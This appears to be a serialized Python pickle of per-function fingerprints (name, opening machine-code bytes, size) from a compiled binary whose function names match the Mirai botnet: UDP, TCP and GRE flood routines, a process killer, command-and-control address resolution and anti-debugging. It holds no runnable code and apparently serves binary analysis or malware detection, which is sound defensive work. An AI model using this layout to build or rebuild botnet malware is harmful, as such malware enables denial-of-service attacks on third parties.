(lp0
(S'_init'
p1
S''
p2
L20L
tp3
a(S'__do_global_dtors_aux'
p4
S'86962f11e690612221'
p5
L76L
tp6
a(S'frame_dummy'
p7
S'e6122221110b00d46118110e896f4ff6410909090909090909090909e34ff600'
p8
L74L
tp9
a(S'_start'
p10
S'00f62f462f07d02f040406d1410905'
p11
L30L
tp12
a(S'attack_app_http'
p13
S'86962fa62fb6'
p14
L6554L
tp15
a(S'attack_get_opt_str'
p16
S'734c15536104106160318ba00410616031'
p17
L64L
tp18
a(S'attack_get_opt_ip'
p19
S'cbff4f5a470d07d040000805d040095a400d4ff9fc0b5a'
p20
L44L
tp21
a(S'attack_get_opt_int'
p22
S'cbff4f5a470d07d040000805d0400a5a400d4ff9fc0b5a'
p23
L44L
tp24
a(S'attack_start'
p25
S'86962fa62fb6'
p26
L182L
tp27
a(S'attack_parse'
p28
S'86962fa62fb6'
p29
L486L
tp30
a(S'attack_kill_all'
p31
S'86962fa62fb6'
p32
L62L
tp33
a(S'add_attack'
p34
S'86962fa62f226a680be56921d845a2400402801342960271284ff669'
p35
L76L
tp36
a(S'attack_init'
p37
S'8622d8d54800110be4d54802100be4d54803d54804d548054806e4d54807e4d5480a4ff600'
p38
L74L
tp39
a(S'attack_gre_eth'
p40
S'86962fa62fb6'
p41
L1296L
tp42
a(S'attack_gre_ip'
p43
S'86962fa62fb6'
p44
L1194L
tp45
a(S'attack_tcp_stomp'
p46
S'86962fa62fb6'
p47
L1646L
tp48
a(S'attack_tcp_ack'
p49
S'86962fa62fb6'
p50
L1302L
tp51
a(S'attack_tcp_syn'
p52
S'86962fa62fb6'
p53
L1306L
tp54
a(S'attack_udp_plain'
p55
S'86962fa62fb6'
p56
L558L
tp57
a(S'attack_udp_generic'
p58
S'86962fa62fb6'
p59
L964L
tp60
a(S'attack_udp_vse'
p61
S'86962fa62fb6'
p62
L914L
tp63
a(S'attack_udp_dns'
p64
S'86962fa62fb6'
p65
L1364L
tp66
a(S'checksum_generic'
p67
S'53600116350145611d308d011c23402d612930600b'
p68
L52L
tp69
a(S'checksum_tcpudp'
p70
S'86962f736d691737078fe7e2611d308d011c1c146342632183391c831c436109611c18379c322c03433809291330634338f88f610760f668'
p71
L126L
tp72
a(S'mem_exists'
p73
S'573711004062606c013289e3a030030b01ff60ff0b09'
p74
L54L
tp75
a(S'killer_kill'
p76
S'22d1040be54f0b09'
p77
L18L
tp78
a(S'killer_kill_by_port'
p79
S'86962fa62fb6'
p80
L1184L
tp81
a(S'killer_init'
p82
S'86962fa62fb6'
p83
L1404L
tp84
a(S'anti_gdb_entry'
p85
S'0203220b09'
p86
L10L
tp87
a(S'teardown_connection'
p88
S'22d160ff06d04009ff0312040be44f0b09'
p89
L36L
tp90
a(S'ensure_single_instance'
p91
S'86962fa62fb6227fe1'
p92
L256L
tp93
a(S'main'
p94
S'86962fa62fb6'
p95
L2076L
tp96
a(S'resolve_cnc_addr'
p97
S'86962fa62fb6'
p98
L132L
tp99
a(S'rand_next'
p100
S'0c7233e2411a0a22270a72120962273340ede22d23200b09'
p101
L52L
tp102
a(S'rand_str'
p103
S'86962fa62fb62269dae14afc7829a0040b7829024a'
p104
L80L
tp105
a(S'rand_alphastr'
p106
S'86962fa62fb6'
p107
L142L
tp108
a(S'rand_init'
p109
S'86962f22d040000dd0400903d040090c9a40090b02'
p110
L64L
tp111
a(S'resolv_skip_name'
p112
S'011220000b436272622c7c13058f74610140611c18e9888b010b09'
p113
L72L
tp114
a(S'resolv_entries_free'
p115
S'8622248d41544824890b00d1418368'
p116
L36L
tp117
a(S'resolv_domain_to_hostname'
p118
S'86962f22680b830373a0888d2001680161002377797362e1224ff668'
p119
L84L
tp120
a(S'resolv_lookup'
p121
S'86962fa62fb6'
p122
L950L
tp123
a(S'consume_any_prompt'
p124
S'465113724227'
p125
L96L
tp126
a(S'can_consume'
p127
S'43611c46522c5c3100'
p128
L16L
tp129
a(S'scanner_kill'
p130
S'22d1040be54f0b09'
p131
L18L
tp132
a(S'deobf'
p133
S'86962fa62f2268536a2a'
p134
L78L
tp135
a(S'add_auth_entry'
p136
S'86962fa62fb6'
p137
L192L
tp138
a(S'setup_connection'
p139
S'86962fa62f227fe1e22f2112234150ff030b00e4e5d0400001ff161ad1411ca1030be6041e9103491b0211a45111a3'
p140
L146L
tp141
a(S'recv_strip_null'
p142
S'8622d040536803e0e301218b01328b4ff60060'
p143
L42L
tp144
a(S'table_retrieve_val'
p145
S'031d6058250371611d600b09'
p146
L30L
tp147
a(S'toggle_obf'
p148
S'864c081b1c1b12681c23411c23464361041161154600430442613332618a1042613332610a1042613332615a21223332616a1001611d8968'
p149
L118L
tp150
a(S'table_lock_val'
p151
S'22d1414c4f0b09'
p152
L14L
tp153
a(S'table_unlock_val'
p154
S'22d1414c4f0b09'
p155
L14L
tp156
a(S'add_entry'
p157
S'86962fa62fcbff4f536a695a400d0a0b031d382891284ff9fcf669'
p158
L68L
tp159
a(S'table_init'
p160
S'8622d8e4d5481ee6e4d5480212d5481dd5480202'
p161
L414L
tp162
a(S'util_strlen'
p163
S'406118068de07001218f707000'
p164
L24L
tp165
a(S'util_strncmp'
p166
S'86962fa62fb6'
p167
L86L
tp168
a(S'util_strcmp'
p169
S'86962fa62fb6226b0b6a69398fe0a0a08b7b7a7960ff024ff66a69'
p170
L76L
tp171
a(S'util_memcpy'
p172
S'68e00101308b00'
p173
L20L
tp174
a(S'util_strcpy'
p175
S'86962fa62f226a6853038306d14101604ff669'
p176
L46L
tp177
a(S'util_zero'
p178
S'5825001401308b00'
p179
L20L
tp180
a(S'util_itoa'
p181
S'86962fa62fb6'
p182
L188L
tp183
a(S'util_memsearch'
p184
S'86573717'
p185
L60L
tp186
a(S'util_stristr'
p187
S'86962fa62f226a680b0363e7a09360237161318de122bf318d60e024328f7735016005e77848dff669'
p188
L108L
tp189
a(S'util_atoi'
p190
S'86962fa62fb6'
p191
L242L
tp192
a(S'util_fdgets'
p193
S'86962fa62fb6'
p194
L92L
tp195
a(S'util_local_addr'
p196
S'86962f227fe261d42b16d0400900120202140be669e06811d1189261067121d0401093830b0a0b8169'
p197
L104L
tp198
a(S'__sdivsi3_i4'
p199
S'5a442d230b'
p200
L14L
tp201
a(S'__udivsi3_i4'
p202
S'0116351a4406'
p203
L40L
tp204
a(S'fcntl'
p205
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf11312772271763304017253637362040216332705d04009a0407e60138230638f68098be32060407e6f4ff668'
p206
L164L
tp207
a(S'fcntl64'
p208
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf11312772271763304017218226012138230638f68098be320336f4ff668'
p209
L144L
tp210
a(S'chdir'
p211
S'860ce6334f6e118230638f68098be32060e34ff668'
p212
L50L
tp213
a(S'close'
p214
S'8606e32f334f6e118230638f68098be32060e34ff668'
p215
L50L
tp216
a(S'fork'
p217
S'8602e6334f6e108230638f68098be32060e34ff668'
p218
L50L
tp219
a(S'getpid'
p220
S'8614e6334f6e108230638f68098be32060e34ff668'
p221
L50L
tp222
a(S'getppid'
p223
S'8640e32f334f6e108230638f68098be32060e34ff668'
p224
L50L
tp225
a(S'ioctl'
p226
S'86f8e22f4ce04fc0e304296862737213aa04bb72729bf872727be34af12c5bf113127722717633040172e36013722712c38230638f68098be320336f4ff668'
p227
L144L
tp228
a(S'kill'
p229
S'862560226e128230638f68098be32060e34ff668'
p230
L50L
tp231
a(S'open'
p232
S'86f8e12f536883e30419686120711540c9bb71208a9bf1f87171f17b4a5b132c331172e07311333053110122120533c38230638f68098be320336f4ff668'
p233
L156L
tp234
a(S'creat'
p235
S'5304056ee3f64109'
p236
L18L
tp237
a(S'prctl'
p238
S'86e622936ee315308f68098b20e06f4ff668'
p239
L46L
tp240
a(S'read'
p241
S'8603e6334f6e138230638f68098be32060e34ff668'
p242
L50L
tp243
a(S'readlink'
p244
S'8655e32f334f6e138230638f68098be32060e34ff668'
p245
L50L
tp246
a(S'select'
p247
S'86e622936ee315308f68098b20e06f4ff668'
p248
L46L
tp249
a(S'setsid'
p250
S'8642e32f334f6e108230638f68098be32060e34ff668'
p251
L50L
tp252
a(S'sigprocmask'
p253
S'8658250a16348bd0400916e120a00833c38230638f68098be32060e34ff668'
p254
L76L
tp255
a(S'time'
p256
S'860d60226e118230638f68098be32060e34ff668'
p257
L50L
tp258
a(S'unlink'
p259
S'860ae6334f6e118230638f68098be32060e34ff668'
p260
L50L
tp261
a(S'write'
p262
S'8604e6334f6e138230638f68098be32060e34ff668'
p263
L50L
tp264
a(S'closedir'
p265
S'86962fa62f436a2f2260'
p266
L108L
tp267
a(S'opendir'
p268
S'86962fa62f00e622d0406e118f680b118be540011189ea230b007ed0403008178d6ae11052111229257110d0e4201a8fe5d141a30bea0c1205d0747e60e34ff66a69'
p269
L186L
tp270
a(S'readdir'
p271
S'864368e643697f6e1ae30b190b915292513117d0560b00e1a011915293582c816134'
p272
L122L
tp273
a(S'__errno_location'
p274
S'03e66ee3f600'
p275
L14L
tp276
a(S'clock'
p277
S'86e622d07f6e0be1e210d00819e34ff668'
p278
L46L
tp279
a(S'memcpy'
p280
S'632068c830e18d3175'
p281
L636L
tp282
a(S'memmove'
p283
S'864361962f58312f632f4368f87f6e411e02e1e1014b6063c903100120'
p284
L978L
tp285
a(S'memset'
p286
S'e607e16e638f5c63416b634303ff72600308f8'
p287
L124L
tp288
a(S'inet_addr'
p289
S'e622d07f6e0b0803c45004e34ff600'
p290
L38L
tp291
a(S'accept'
p292
S'e622d07f6e42511e0540e30ce34ff600'
p293
L34L
tp294
a(S'bind'
p295
S'e622d07f6e42511e02620b0ce34ff600'
p296
L34L
tp297
a(S'connect'
p298
S'e622d07f6e42511e03620b0ce34ff600'
p299
L34L
tp300
a(S'getsockname'
p301
S'e622d07f6e42511e06e41e0b0ce34ff600'
p302
L34L
tp303
a(S'getsockopt'
p304
S'e622d07f6ee742e46273140b14e34ff600'
p305
L40L
tp306
a(S'listen'
p307
S'e622d07f6ee3c8e34e114004086f4ff600'
p308
L36L
tp309
a(S'recv'
p310
S'e622d07f6e42511e0a62730b106f4ff600'
p311
L36L
tp312
a(S'recvfrom'
p313
S'e6227fd06ee8e41ee91e7325186f4ff600'
p314
L44L
tp315
a(S'send'
p316
S'e622d07f6e42511e0962730b106f4ff600'
p317
L36L
tp318
a(S'sendto'
p319
S'e6227fd06ee8e41ee91e7325186f4ff600'
p320
L44L
tp321
a(S'setsockopt'
p322
S'e622d07f6ee7420ee41e6273140b14e34ff600'
p323
L40L
tp324
a(S'socket'
p325
S'e622d07f6e42511e01620b0ce34ff600'
p326
L34L
tp327
a(S'raise'
p328
S'86436822406e05e34ff668'
p329
L32L
tp330
a(S'sigaddset'
p331
S'e615'
p332
L50L
tp333
a(S'sigemptyset'
p334
S'e60005960b6e00e34ff600'
p335
L26L
tp336
a(S'signal'
p337
S'865360962fffe622911806'
p338
L156L
tp339
a(S'__sigismember'
p340
S'536373e1601d6108601fe701013de6606ee3f600'
p341
L44L
tp342
a(S'__sigaddset'
p343
S'5360ffe16242014c326e22c90d21226ff600'
p344
L40L
tp345
a(S'__sigdelset'
p346
S'5360ffe16343014c336e1fc9324200276221236ff600'
p347
L42L
tp348
a(S'malloc'
p349
S'8648242f43622f227f'
p350
L222L
tp351
a(S'calloc'
p352
S'8648242f5363e62208'
p353
L86L
tp354
a(S'free'
p355
S'8648242fa62fb6'
p356
L208L
tp357
a(S'realloc'
p358
S'865825b6436b53e622'
p359
L234L
tp360
a(S'__heap_alloc'
p361
S'52'
p362
L98L
tp363
a(S'__heap_alloc_at'
p364
S'4262762f25633156318d2019021b128901225218030d24a032055228d8336ff600'
p365
L102L
tp366
a(S'__heap_link_free_area'
p367
S'e668155116027800f600'
p368
L34L
tp369
a(S'__heap_link_free_area_after'
p370
S'e6686e511601620b09'
p371
L26L
tp372
a(S'__heap_free'
p373
S'865360962f6c302f0022685231892871a0830c06318d3169238d610c1032560d57780e8d72280c100873730ed1410905d10b9228a0037962930b9360e34ff669'
p374
L166L
tp375
a(S'abort'
p376
S'86e622913018305c980b6eec38e2a0'
p377
L200L
tp378
a(S'atol'
p379
S'0400e60a6ee3f64109'
p380
L18L
tp381
a(S'strtol'
p382
S'0301e66ee3f64109'
p383
L16L
tp384
a(S'_stdlib_strto_l'
p385
S'864368a62fb6'
p386
L304L
tp387
a(S'sleep'
p388
S'8648242fa62fb6e622911802009893200001ff611141f98d8d1148d032391f124093118fe49843d040836b0be520932001ff611141f98d94113534401c11'
p389
L332L
tp390
a(S'__uClibc_fini'
p391
S'86152f1822486e05d1601e014109'
p392
L86L
tp393
a(S'__pthread_return_0'
p394
S'e6006ee3f600'
p395
L14L
tp396
a(S'_pthread_cleanup_push_defer'
p397
S'e66ee3f600'
p398
L12L
tp399
a(S'__check_one_fd'
p400
S'865368e64369406eff090b903089d14109e34ff669'
p401
L56L
tp402
a(S'__uClibc_init'
p403
S'e622d26118120c121222010a1804e34ff64109e34ff600'
p404
L60L
tp405
a(S'sbrk'
p406
S'86962fa62f436a2f'
p407
L72L
tp408
a(S'__socketcall'
p409
S'86e32f334f6e128230638f68098be32060e34ff668'
p410
L50L
tp411
a(S'_exit'
p412
S'86962f43696e0c01931116308f68098b20af09'
p413
L40L
tp414
a(S'fstat'
p415
S'866ce32f332f53697f6ee3128230638f68098be3202333d10b407e60e34ff66a69'
p416
L80L
tp417
a(S'__getdents'
p418
S'865368b6'
p419
L120L
tp420
a(S'__getdents64'
p421
S'86632f06712f092f082f536b632f2293'
p422
L248L
tp423
a(S'getegid'
p424
S'86e622936e33c38230638f68098be32060e34ff668'
p425
L50L
tp426
a(S'geteuid'
p427
S'86e622936e33c38230638f68098be32060e34ff668'
p428
L50L
tp429
a(S'getgid'
p430
S'86e622936e33c38230638f68098be32060e34ff668'
p431
L50L
tp432
a(S'getuid'
p433
S'86e622936e33c38230638f68098be32060e34ff668'
p434
L50L
tp435
a(S'lseek64'
p436
S'86632f73e653227fe9e323c31c16308f68098b20a003041ae3c81f51086f4ff669'
p437
L86L
tp438
a(S'nanosleep'
p439
S'86e622936e33c38230638f68098be32060e34ff668'
p440
L50L
tp441
a(S'times'
p442
S'862be6334f6e118230638f68098be32060e34ff668'
p443
L50L
tp444
a(S'__xstat64_conv'
p445
S'8660e62f5368b683e5d04f0b6e9d5193635b8340761872500010916121619455122d187754181816799b529551349c531516b6a718180e186f4ff66bf668'
p446
L128L
tp447
a(S'__xstat_conv'
p448
S'8658e62f5368b683e5d06e0b7b519363187793601b0c9651936a731c0e7a512d1d51000118621b612d6154181b7627181841186f4ff66bf668'
p449
L138L
tp450
a(S'inet_aton'
p451
S'8648242fa62f536a2f'
p452
L194L
tp453
a(S'sigaction'
p454
S'865825a62f00b6632f436b3b6e385661ec38123393617c13121818e614b30be72a8d690ed06104180b7553a37111119793607ce34ff66bf668'
p455
L144L
tp456
a(S'_dl_aux_init'
p457
S'475205536e220332e3f600'
p458
L24L
tp459
a(S'_brk'
p460
S'862d60226e118230638f68098be32060e34ff668'
p461
L50L
tp462
a(S'__init_brk'
p463
S'860d612221d040000802068bd040090c1201e34ff668'
p464
L56L
tp465
a(S'__syscall_rt_sigaction'
p466
S'86e622936e33c38230638f68098be32060e34ff668'
p467
L50L
tp468
a(S'__do_global_ctors_aux'
p469
S'8609e6'
p470
L38L
tp471
a(S'_fini'
p472
g2
L20L
tp473
a.